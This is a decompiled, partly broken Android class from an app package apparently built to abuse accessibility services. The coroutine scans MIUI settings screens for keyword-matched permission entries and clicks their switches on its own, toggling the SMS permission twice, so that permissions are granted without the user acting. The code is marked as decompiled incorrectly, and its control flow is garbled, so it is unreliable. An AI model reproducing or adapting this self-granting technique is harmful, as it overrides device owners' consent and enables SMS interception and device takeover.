package com.storm.safe.rock.manager;

import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.internal.Ref$IntRef;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0715je;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.dh0;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$startMiuiPermissionAutoToggle$1", m214403f = "PermissionGranter.kt", m214404l = {5160, 5178}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$startMiuiPermissionAutoToggle$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52029a1;

    /* renamed from: a2 */
    public int f52030a2;

    /* renamed from: a3 */
    public int f52031a3;

    /* renamed from: a4 */
    public Ref$IntRef f52032a4;

    /* renamed from: a5 */
    public C0260a2 f52033a5;

    /* renamed from: a6 */
    public List f52034a6;

    /* renamed from: a7 */
    public int f52035a7;

    /* renamed from: a8 */
    public final /* synthetic */ String f52036a8;

    /* renamed from: a9 */
    public final /* synthetic */ C0260a2 f52037a9;

    /* renamed from: b0 */
    public final /* synthetic */ List f52038b0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$startMiuiPermissionAutoToggle$1(String str, C0260a2 c0260a2, List list, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52036a8 = str;
        this.f52037a9 = c0260a2;
        this.f52038b0 = list;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$startMiuiPermissionAutoToggle$1(this.f52036a8, this.f52037a9, this.f52038b0, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$startMiuiPermissionAutoToggle$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Can't wrap try/catch for region: R(5:80|81|131|82|(2:142|84)(0)) */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x00c9, code lost:
    
        if (p000.b81.m210571b1(r4, r1) == r3) goto L36;
     */
    /* JADX WARN: Code restructure failed: missing block: B:85:0x01b5, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:124:0x023d  */
    /* JADX WARN: Removed duplicated region for block: B:20:0x0067  */
    /* JADX WARN: Removed duplicated region for block: B:26:0x0088 A[Catch: Exception -> 0x0026, TryCatch #0 {Exception -> 0x0026, blocks: (B:7:0x001f, B:24:0x0080, B:26:0x0088, B:29:0x0090, B:31:0x00a6, B:34:0x00b7, B:39:0x00d2, B:41:0x00e6, B:44:0x00f8, B:49:0x0104, B:51:0x010a, B:56:0x011c, B:58:0x0132, B:61:0x0139, B:62:0x013d, B:64:0x0143, B:66:0x0153, B:69:0x0164, B:71:0x016e, B:74:0x017d, B:76:0x018f, B:78:0x019f), top: B:129:0x001f }] */
    /* JADX WARN: Removed duplicated region for block: B:27:0x008d  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0090 A[Catch: Exception -> 0x0026, TryCatch #0 {Exception -> 0x0026, blocks: (B:7:0x001f, B:24:0x0080, B:26:0x0088, B:29:0x0090, B:31:0x00a6, B:34:0x00b7, B:39:0x00d2, B:41:0x00e6, B:44:0x00f8, B:49:0x0104, B:51:0x010a, B:56:0x011c, B:58:0x0132, B:61:0x0139, B:62:0x013d, B:64:0x0143, B:66:0x0153, B:69:0x0164, B:71:0x016e, B:74:0x017d, B:76:0x018f, B:78:0x019f), top: B:129:0x001f }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:124:0x023d -> B:38:0x00ce). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:126:0x024a -> B:127:0x024e). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:35:0x00c9 -> B:37:0x00cc). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        int i;
        Ref$IntRef ref$IntRef;
        int i2;
        C0260a2 c0260a2;
        List list;
        int i3;
        Ref$IntRef ref$IntRef2;
        C0260a2 c0260a22;
        int i4;
        int i5;
        C1351vv c1351vv;
        int i6;
        AccessibilityNodeInfo rootInActiveWindow;
        boolean z;
        Object obj2;
        int i7;
        CharSequence className;
        String string;
        AccessibilityNodeInfo accessibilityNodeInfo;
        String str;
        String string2;
        String string3;
        PermissionGranter$startMiuiPermissionAutoToggle$1 permissionGranter$startMiuiPermissionAutoToggle$1 = this;
        C1351vv c1351vv2 = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i8 = permissionGranter$startMiuiPermissionAutoToggle$1.f52035a7;
        long j = 500;
        int i9 = 2;
        int i10 = 0;
        int i11 = 1;
        if (i8 == 0) {
            kg1.m213544f4(obj);
            i = permissionGranter$startMiuiPermissionAutoToggle$1.f52036a8.equalsIgnoreCase("sms") ? 2 : 1;
            ref$IntRef = new Ref$IntRef();
            i2 = 18;
            c0260a2 = permissionGranter$startMiuiPermissionAutoToggle$1.f52037a9;
            list = permissionGranter$startMiuiPermissionAutoToggle$1.f52038b0;
            i3 = 0;
            if (i3 < i2) {
            }
            return c1351vv2;
        }
        if (i8 != 1) {
            if (i8 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i5 = permissionGranter$startMiuiPermissionAutoToggle$1.f52031a3;
            i2 = permissionGranter$startMiuiPermissionAutoToggle$1.f52030a2;
            i4 = permissionGranter$startMiuiPermissionAutoToggle$1.f52029a1;
            list = permissionGranter$startMiuiPermissionAutoToggle$1.f52034a6;
            c0260a22 = permissionGranter$startMiuiPermissionAutoToggle$1.f52033a5;
            ref$IntRef2 = permissionGranter$startMiuiPermissionAutoToggle$1.f52032a4;
            try {
                kg1.m213544f4(obj);
                i6 = 1;
            } catch (Exception e) {
                e = e;
                c1351vv = c1351vv2;
                t60.m214705c6("PermissionGranter", "❌ [权限] 自动切换权限开关失败", e);
                i = i4;
                c0260a2 = c0260a22;
                i6 = 1;
                i3 = i5 + 1;
                permissionGranter$startMiuiPermissionAutoToggle$1 = this;
                ref$IntRef = ref$IntRef2;
                i11 = i6;
                c1351vv2 = c1351vv;
                j = 500;
                i9 = 2;
                i10 = 0;
                if (i3 < i2) {
                }
                return c1351vv2;
            }
            c1351vv = c1351vv2;
            i = i4;
            c0260a2 = c0260a22;
            i3 = i5 + 1;
            permissionGranter$startMiuiPermissionAutoToggle$1 = this;
            ref$IntRef = ref$IntRef2;
            i11 = i6;
            c1351vv2 = c1351vv;
            j = 500;
            i9 = 2;
            i10 = 0;
            if (i3 < i2) {
                permissionGranter$startMiuiPermissionAutoToggle$1.f52032a4 = ref$IntRef;
                permissionGranter$startMiuiPermissionAutoToggle$1.f52033a5 = c0260a2;
                permissionGranter$startMiuiPermissionAutoToggle$1.f52034a6 = list;
                permissionGranter$startMiuiPermissionAutoToggle$1.f52029a1 = i;
                permissionGranter$startMiuiPermissionAutoToggle$1.f52030a2 = i2;
                permissionGranter$startMiuiPermissionAutoToggle$1.f52031a3 = i3;
                permissionGranter$startMiuiPermissionAutoToggle$1.f52035a7 = i11;
                if (b81.m210571b1(j, permissionGranter$startMiuiPermissionAutoToggle$1) != coroutineSingletons) {
                    ref$IntRef2 = ref$IntRef;
                    i5 = i3;
                    c0260a22 = c0260a2;
                    i4 = i;
                    dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                    rootInActiveWindow = c0290a0 == null ? c0290a0.getRootInActiveWindow() : null;
                    if (rootInActiveWindow == null) {
                        i6 = i11;
                        if (C0260a2.m211259a2(c0260a22, rootInActiveWindow, AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55758a8, dh0.f55759a9), dh0.f55750a0))) {
                            ref$IntRef2.f57624a0++;
                            rootInActiveWindow.recycle();
                            if (ref$IntRef2.f57624a0 < i4) {
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52032a4 = ref$IntRef2;
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52033a5 = c0260a22;
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52034a6 = list;
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52029a1 = i4;
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52030a2 = i2;
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52031a3 = i5;
                                permissionGranter$startMiuiPermissionAutoToggle$1.f52035a7 = i9;
                            }
                        } else {
                            ArrayList arrayList = new ArrayList();
                            C0260a2.m211270b7(i10, rootInActiveWindow, arrayList);
                            ArrayList arrayList2 = new ArrayList();
                            int size = arrayList.size();
                            int i12 = i10;
                            while (i12 < size) {
                                Object obj3 = arrayList.get(i12);
                                i12++;
                                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj3;
                                CharSequence text = accessibilityNodeInfo2.getText();
                                String str2 = (text == null || (string3 = text.toString()) == null) ? "" : string3;
                                CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                                if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                    accessibilityNodeInfo = rootInActiveWindow;
                                    str = "";
                                } else {
                                    accessibilityNodeInfo = rootInActiveWindow;
                                    str = string2;
                                }
                                String str3 = str2 + " " + str;
                                if (list == null || !list.isEmpty()) {
                                    Iterator it = list.iterator();
                                    while (true) {
                                        if (it.hasNext()) {
                                            Iterator it2 = it;
                                            if (AbstractC0779a1.m213652a5(str3, (String) it.next(), i6)) {
                                                arrayList2.add(obj3);
                                                break;
                                            }
                                            it = it2;
                                            i6 = 1;
                                        }
                                    }
                                }
                                rootInActiveWindow = accessibilityNodeInfo;
                                i6 = 1;
                            }
                            AccessibilityNodeInfo accessibilityNodeInfo3 = rootInActiveWindow;
                            int size2 = arrayList2.size();
                            boolean z2 = false;
                            int i13 = 0;
                            while (true) {
                                if (i13 >= size2) {
                                    c1351vv = c1351vv2;
                                    break;
                                }
                                Object obj4 = arrayList2.get(i13);
                                i13++;
                                AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj4;
                                if (C0260a2.m211257a0(c0260a22, accessibilityNodeInfo4)) {
                                    z2 = true;
                                }
                                ArrayList arrayList3 = new ArrayList();
                                C0260a2.m211270b7(0, accessibilityNodeInfo4, arrayList3);
                                int size3 = arrayList3.size();
                                int i14 = size2;
                                int i15 = 0;
                                while (true) {
                                    if (i15 >= size3) {
                                        z = z2;
                                        c1351vv = c1351vv2;
                                        obj2 = null;
                                        break;
                                    }
                                    obj2 = arrayList3.get(i15);
                                    int i16 = i15 + 1;
                                    AccessibilityNodeInfo accessibilityNodeInfo5 = (AccessibilityNodeInfo) obj2;
                                    CharSequence className2 = accessibilityNodeInfo5.getClassName();
                                    if (className2 != null) {
                                        i7 = i16;
                                        String string4 = className2.toString();
                                        if (string4 != null) {
                                            z = z2;
                                            c1351vv = c1351vv2;
                                            if (AbstractC0779a1.m213652a5(string4, "Switch", true)) {
                                                break;
                                            }
                                        }
                                        if (!accessibilityNodeInfo5.isCheckable() || (accessibilityNodeInfo5.isClickable() && (className = accessibilityNodeInfo5.getClassName()) != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, "Button", true))) {
                                            break;
                                        }
                                        z2 = z;
                                        i15 = i7;
                                        c1351vv2 = c1351vv;
                                    } else {
                                        i7 = i16;
                                    }
                                    z = z2;
                                    c1351vv = c1351vv2;
                                    if (!accessibilityNodeInfo5.isCheckable()) {
                                        break;
                                        break;
                                    }
                                    z2 = z;
                                    i15 = i7;
                                    c1351vv2 = c1351vv;
                                }
                                AccessibilityNodeInfo accessibilityNodeInfo6 = (AccessibilityNodeInfo) obj2;
                                z2 = (accessibilityNodeInfo6 == null || !C0260a2.m211257a0(c0260a22, accessibilityNodeInfo6)) ? z : true;
                                int size4 = arrayList3.size();
                                int i17 = 0;
                                while (i17 < size4) {
                                    Object obj5 = arrayList3.get(i17);
                                    i17++;
                                    ((AccessibilityNodeInfo) obj5).recycle();
                                }
                                accessibilityNodeInfo4.recycle();
                                if (z2) {
                                    break;
                                }
                                size2 = i14;
                                c1351vv2 = c1351vv;
                            }
                            int size5 = arrayList.size();
                            int i18 = 0;
                            while (i18 < size5) {
                                Object obj6 = arrayList.get(i18);
                                i18++;
                                ((AccessibilityNodeInfo) obj6).recycle();
                            }
                            accessibilityNodeInfo3.recycle();
                            if (z2 && ref$IntRef2.f57624a0 >= i4) {
                                return c1351vv;
                            }
                            i = i4;
                            c0260a2 = c0260a22;
                            i6 = 1;
                            i3 = i5 + 1;
                            permissionGranter$startMiuiPermissionAutoToggle$1 = this;
                            ref$IntRef = ref$IntRef2;
                            i11 = i6;
                            c1351vv2 = c1351vv;
                            j = 500;
                            i9 = 2;
                            i10 = 0;
                            if (i3 < i2) {
                            }
                        }
                    } else {
                        c1351vv = c1351vv2;
                        i6 = i11;
                        i = i4;
                        c0260a2 = c0260a22;
                        i3 = i5 + 1;
                        permissionGranter$startMiuiPermissionAutoToggle$1 = this;
                        ref$IntRef = ref$IntRef2;
                        i11 = i6;
                        c1351vv2 = c1351vv;
                        j = 500;
                        i9 = 2;
                        i10 = 0;
                        if (i3 < i2) {
                        }
                    }
                }
                return coroutineSingletons;
            }
            return c1351vv2;
        }
        int i19 = permissionGranter$startMiuiPermissionAutoToggle$1.f52031a3;
        int i20 = permissionGranter$startMiuiPermissionAutoToggle$1.f52030a2;
        int i21 = permissionGranter$startMiuiPermissionAutoToggle$1.f52029a1;
        List list2 = permissionGranter$startMiuiPermissionAutoToggle$1.f52034a6;
        C0260a2 c0260a23 = permissionGranter$startMiuiPermissionAutoToggle$1.f52033a5;
        Ref$IntRef ref$IntRef3 = permissionGranter$startMiuiPermissionAutoToggle$1.f52032a4;
        kg1.m213544f4(obj);
        ref$IntRef2 = ref$IntRef3;
        c0260a22 = c0260a23;
        list = list2;
        i4 = i21;
        i2 = i20;
        i5 = i19;
        dqtvuisjd c0290a02 = dqtvuisjd.f52358m1.getInstance();
        if (c0290a02 == null) {
        }
        if (rootInActiveWindow == null) {
        }
    }
}
